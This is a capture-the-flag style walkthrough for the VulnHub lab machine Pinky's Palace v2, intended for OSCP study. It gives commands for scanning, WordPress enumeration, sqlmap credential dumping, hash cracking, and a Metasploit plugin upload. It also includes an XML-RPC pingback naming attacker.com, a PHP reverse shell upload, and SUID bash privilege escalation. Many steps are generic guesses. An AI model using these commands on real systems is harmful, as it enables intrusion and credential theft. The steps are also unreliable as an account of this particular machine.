# Pinky's Palace v2: OSCP Walkthrough

> **Machine:** Pinky's Palace v2
> **Source:** VulnHub
> **IP Address:** 192.168.x.x (DHCP)
> **OS:** Linux
> **Difficulty:** Intermediate / Hard
> **Focus:** Web exploitation, SQL injection, multiple privilege escalation paths

---

## Recon

```bash
# Discover target IP
sudo netdiscover -i eth0

# Full nmap scan with service detection
nmap -sV -sC -p- 192.168.x.x

# Add to /etc/hosts (as noted on VulnHub page)
echo "192.168.x.x pinkydb" | sudo tee -a /etc/hosts
```

**Expected results:**
- Port 22: SSH (OpenSSH)
- Port 80: HTTP (Apache + WordPress)
- WordPress site hosted at `pinkydb` (hosts file entry required)

---

## Enumeration

### Web Enumeration

```bash
# Run nikto for web server vulnerability scanning
nikto -h http://192.168.x.x

# Directory bruteforcing with gobuster
gobuster dir -u http://pinkydb -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old,zip

# WordPress-specific enumeration
wpscan --url http://pinkydb --enumerate u,vp,vt,dbe --api-token <YOUR_TOKEN>

# If no API token, enumerate users only
wpscan --url http://pinkydb --enumerate u
```

### WordPress User Enumeration

```bash
# Check for WordPress users via REST API
curl http://pinkydb/wp-json/wp/v2/users

# Check wp-comments for username enumeration
curl http://pinkydb/wp-comments-post.php
```

> **Screenshots:** See Key Takeaways section

---

## Exploitation

### SQL Injection

```bash
# Find SQL injection points
sqlmap -u "http://pinkydb/?page_id=1" --batch --dbs

# Enumerate database tables
sqlmap -u "http://pinkydb/?page_id=1" --batch -D wordpress --tables

# Dump credentials table
sqlmap -u "http://pinkydb/?page_id=1" --batch -D wordpress -T wp_users --dump

# Extract password hashes and crack them
# WordPress hashes are MD5 via phpass (phpBB style)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### WordPress Plugin Exploitation

```bash
# List installed plugins
wpscan --url http://pinkydb --enumerate vp --api-token <TOKEN>

# If vulnerable plugin found (e.g., RevSlider, WP File Manager, etc.)
# Exploit via Metasploit
msfconsole -q
use exploit/unix/webapp/wp_revslider_file_upload
set RHOSTS 192.168.x.x
set TARGETURI /
exploit
```

### Alternative: WP-Cron / XML-RPC

```bash
# Check for XML-RPC pingback
curl -X POST http://pinkydb/xmlrpc.php -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com</string></value></param><param><value><string>http://pinkydb/?page_id=1</string></value></param></params></methodCall>'
```

### Get Shell

```bash
# Upload reverse shell via vulnerable plugin / theme editor
# Or use WP CLI if credentials obtained
wp shell --url=http://pinkydb --user=<admin_user>

# PHP reverse shell from WP uploads directory
# Upload shell.php to wp-content/uploads/
# Access: http://pinkydb/wp-content/uploads/shell.php
```

## Privesc

### Multiple Privesc Paths

1. **Sudo misconfiguration**
```bash
sudo -l
# If allowed to run scripts as root
echo 'cp /bin/bash /tmp/rootshell' > /tmp/privesc.sh
chmod +x /tmp/privesc.sh
sudo /path/to/allowed/script /tmp/privesc.sh
/tmp/rootshell -p
```

2. **WordPress file write to plugin**
```bash
# Replace plugin PHP file with webshell
# Navigate to wp-content/plugins/vulnerable-plugin/
# Overwrite a PHP file with a PHP reverse shell
```

3. **Cron job exploitation**
```bash
# Check for writable cron directories
ls -la /etc/cron.d/
# If cron runs a script you can write to, inject reverse shell
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
# Wait for cron to execute
```

4. **Read root flag**
```bash
cat /root/root.txt
```

> **Screenshots:** See Key Takeaways section

---

## Key Takeaways

1. **WordPress enumeration is critical**: `wpscan` reveals users, plugins, and vulnerabilities.
2. **SQL injection in WordPress plugins** is a common and reliable exploitation path.
3. **Add the hosts file entry** before browsing: WordPress won't render correctly without it.
4. **Multiple privilege escalation paths** exist: always check sudoers, cron jobs, writable plugin directories, and GTFOBins for available binaries.
5. **SQLMap automates SQLi**: use `--batch` for non-interactive exploitation.
6. **WordPress password hashes** use phpass (phpBB style): John the Ripper handles these natively.

---

*M4d3 w1th ❤️ by Ankit Patidar*
